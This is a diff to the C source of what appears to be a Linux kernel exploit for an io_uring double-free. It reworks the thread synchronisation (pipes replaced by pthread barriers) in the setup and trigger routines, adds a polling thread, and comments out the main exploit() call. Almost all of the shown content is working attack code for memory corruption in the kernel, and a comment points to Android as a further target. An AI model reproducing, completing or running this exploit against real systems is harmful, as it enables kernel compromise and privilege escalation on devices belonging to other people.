@@ -500,20 +500,52 @@ typedef struct {
   IoUring io_uring;
   int read_poll_fd;
   pthread_t trigger_thread;
-  int pipe_to_thread[2];
-  int pipe_from_thread[2];
-  // pthread_barrier_t setup_barrier;
-  // pthread_barrier_t setup_done_barrier;
-  // pthread_barrier_t trigger_barrier;
+  pthread_barrier_t setup_barrier;
+  pthread_barrier_t setup_done_barrier;
+  pthread_barrier_t trigger_barrier;
   char *buf;
 } Context;
+
+void *do_poll(void *arg) {
+  Context *context = (Context *) arg;
+  pin_to_cpu(0);
+
+  io_uring_enter_poll(&context->io_uring, 1);
+
+  for (;;) {
+    sleep(100);
+  }
+
+  return NULL;
+}
+
+void poll_event(Context *context) {
+  pthread_t thread;
+  pthread_create(&thread, NULL, do_poll, context);
+  pthread_join(thread, NULL);
+}
+
+// void trigger_bug(Context *context) {
+//   struct io_uring_sqe *sqe = &context->io_uring.sq_entries[0];
+//   memset(sqe, 0, sizeof(struct io_uring_sqe));
+//   sqe->opcode = IORING_OP_READ;
+//   sqe->fd = context->read_poll_fd;
+//   sqe->off = 0;
+//   sqe->addr = (usize) context->buf;
+//   sqe->len = 4096;
+//   sqe->user_data = 0x6969;
+
+//   io_uring_submit_sqe(&context->io_uring, sqe);
+//   io_uring_enter_submit(&context->io_uring, 1);
+
+//   poll_event(context);
+// }
 
 Context context = { 0 };
 
 void *trigger_thread(void *arg) {
   pin_to_cpu(0);
-  
-  SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
+  pthread_barrier_wait(&context.setup_barrier);
 
   // submit read which will be io polled by other task
   struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
@@ -532,41 +564,29 @@ void *trigger_thread(void *arg) {
   printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
   printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
 
-  SYSCHK(write(context.pipe_from_thread[1], context.buf, 1));
+  pthread_barrier_wait(&context.setup_done_barrier);
 
-  SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
+  pthread_barrier_wait(&context.trigger_barrier);
   // after trigger barrier hit, exit thread which triggers double free of io_uring context in current task
 
   return NULL;
 }
 
 void setup_bug() {
-  SYSCHK(pipe(context.pipe_from_thread));
-  SYSCHK(pipe(context.pipe_to_thread));
-
-  // init_barrier(&context.setup_barrier, 2);
-  // init_barrier(&context.setup_done_barrier, 2);
-  // init_barrier(&context.trigger_barrier, 2);
+  init_barrier(&context.setup_barrier, 2);
+  init_barrier(&context.setup_done_barrier, 2);
+  init_barrier(&context.trigger_barrier, 2);
   // context.read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
   context.read_poll_fd = SYSCHK(open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY | O_DIRECT | O_NONBLOCK));
   context.buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
-  // prefault pipes
-  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
-  SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
-  SYSCHK(write(context.pipe_from_thread[1], context.buf, 1));
-  SYSCHK(read(context.pipe_from_thread[0], context.buf, 1));
-
-  context.io_uring = io_uring_setup();
-
   // spawn other thread before allocating io uring stuff
   pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);
 
-  // have other thread submit read
-  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
+  context.io_uring = io_uring_setup();
 
-  // wait for it to finish
-  SYSCHK(read(context.pipe_from_thread[0], context.buf, 1));
+  // have other thread submit read
+  pthread_barrier_wait(&context.setup_barrier);
 
   // submit 1 random read, to give our own task a valid current->io_uring
   // otherwise it is null, since there is a bug in kernel poll with iopoll does not set this up
@@ -581,11 +601,15 @@ void setup_bug() {
 
   io_uring_submit_sqe(&context.io_uring, sqe);
   io_uring_enter_submit(&context.io_uring, 1);
+
+  // wait for it to finish
+  pthread_barrier_wait(&context.setup_done_barrier);
 }
 
 void trigger_bug() {
   io_uring_enter_poll(&context.io_uring, 2);
-  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
+  pthread_barrier_wait(&context.trigger_barrier);
+  pthread_join(context.trigger_thread, NULL);
 }
 
 void trigger_process(int start_step_pipes[2], int end_step_pipes[2]) {
@@ -808,8 +832,15 @@ void exploit() {
   }
 }
 
+void *thread(void *a) {
+  return NULL;
+}
+
 int main() {
   puts("Starting exploit...");
+
+  pthread_t t;
+  pthread_create(&t, NULL, thread, NULL);
 
   pin_to_cpu(0);
 
@@ -819,7 +850,7 @@ int main() {
   //   .buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
   // };
 
-  exploit();
+  //exploit();
 
   // trigger_bug(&context);
 
